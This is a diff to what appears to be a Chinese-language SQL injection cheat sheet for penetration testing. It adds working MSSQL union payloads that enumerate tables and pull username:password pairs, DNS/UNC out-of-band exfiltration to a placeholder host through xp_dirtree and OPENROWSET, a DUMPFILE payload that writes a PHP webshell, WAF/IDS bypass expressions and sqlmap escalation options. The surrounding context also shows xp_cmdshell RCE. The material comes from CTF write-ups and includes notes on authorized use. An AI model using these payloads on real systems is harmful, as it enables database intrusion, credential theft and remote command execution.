@@ -94,6 +94,32 @@ id=1 AND pg_sleep(5)                        -- PostgreSQL
 
 **MSSQL**：`; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC master..xp_cmdshell 'whoami'--`（sa 权限 RCE）。
 
+**MSSQL union 系统表枚举链**（有 union 回显时逐步换表；来源：HTB-StreamIO）：
+
+```sql
+enil' union select 1,name,3,4,5,6 from master..sysdatabases -- -              -- 全库清单
+enil' union select 1,(select DB_NAME()),3,4,5,6 from master..sysdatabases -- -  -- 当前库名
+enil' union select 1,name,id,4,5,6 from <库>..sysobjects where xtype='U' -- -  -- 用户表 + id
+enil' union select 1,name,id,4,5,6 from <库>..syscolumns where id in (<上一步id>) -- -  -- 列
+enil' union select 1,concat(username,':',password),id,4,5,6 from users -- -    -- 拼接拖凭据（样本纪律同 §5）
+```
+
+**MSSQL 进库后权限自查链**（拿到 SQL 凭据直连场景，非注入点；来源：SQL 注入精要）：
+
+```sql
+SELECT SYSTEM_USER,SUSER_NAME(),CURRENT_USER;   -- 服务器级登录名 / 安全上下文 / 数据库用户身份，三者可不同，以低者为准
+SELECT IS_SRVROLEMEMBER('sysadmin');             -- 1=sysadmin，0=否（决定 xp_cmdshell 等利用面）
+```
+
+**MSSQL OOB / DNS 外带**（无回显时用 UNC 路径触发目标主动发起连接；来源：SQL 注入精要）：
+
+```sql
+?vulnerableParam=1; DECLARE @q varchar(1024); SET @q = '\\'+({INJECT})+'.yourhost.com\test.txt'; EXEC master..xp_dirtree @q
+SELECT * FROM OPENROWSET('SQLOLEDB', ({INJECT})+'.yourhost.com';'sa';'pwd', 'SELECT 1')
+```
+
+**SQLi 写 webshell 的 DUMPFILE 变体**（与 outfile 并列；DUMPFILE 不转义换行、写二进制更稳，写入带 GET 参数的马；来源：Credit Card Scammers Writeup）：`SELECT "<?php passthru($_GET['cmd']); ?>" INTO DUMPFILE '/var/www/html/shell.php'` → `shell.php?cmd=pwd`。
+
 **NoSQL（MongoDB）**：`{"username": {"$ne": ""}, "password": {"$ne": ""}}` 认证绕过；`{"username": {"$regex": "^a"}}` 盲注逐字符 `[HackTricks]`。
 
 ### 4.6 Bypass 矩阵 `[本地 src-hunter §4]`
@@ -107,6 +133,8 @@ id=1 AND pg_sleep(5)                        -- PostgreSQL
 | 函数 | `mid()/substr()/substring()/left()` 互换 |
 | 注释 | `--` / `#` / `/**/` / `;%00` |
 | 入口换 | Header / Cookie / `X-Forwarded-For` 注入 |
+| 真值恒等表达式（IDS 语义等价族，来源：SQL 注入精要） | `' OR 'john' = 'john'` / `' OR 'microsoft' = 'micro'+'soft'` / `' OR 'movies' = N'movies'` / `' OR 'software' like 'soft%'` / `' OR 'whatever' IN ('whatever')` / `' OR 5 BETWEEN 1 AND 7` / 拼接拆分 `'; EXEC ('SEL' + 'ECT US' + 'ER')` |
+| 黑名单拦 `or 1=1`（LIKE 模糊查询上下文） | `e' and 1=1 -- -`——查询变 `... where film like '%e' and 1=1 -- -%'`，用 `and` 替 `or`、靠注释截断尾部引号（来源：HTB-StreamIO） |
 
 ## 5. 工具用法
 
@@ -119,6 +147,18 @@ sqlmap -u "..." -D db -T users -C "username,password" --dump --start 1 --stop 3
 sqlmap -u "..." --tamper=between,space2comment,charencode   # WAF 绕过
 sqlmap -u "..." --technique=B --time-sec=10   # 仅布尔/时间盲，降速
 ```
+
+**--level / --risk 逐级语义**（怀疑注入点不在 GET/POST 参数时逐级加深；来源：SQL 注入精要）：
+
+| 级别 | --level 测试范围 | --risk 加入的攻击 |
+|---|---|---|
+| 1 | 基础参数（快速扫描默认） | 仅 SELECT 类测试，不修改数据 |
+| 2 | + Cookie | + 基于时间的盲注 |
+| 3 | + HTTP 请求头 | + OR 型注入 |
+| 4 | + Host 头，更复杂编码 | |
+| 5 | 全部 HTTP 头 | |
+
+原文示例：`sudo sqlmap -u "http://10.10.10.15/login" --dbs --level 3 --batch`。
 
 > 纪律：`--threads=1 --delay=1` 降速；`--start 1 --stop 3` 只取样本；`--os-shell` 仅授权场景。
 
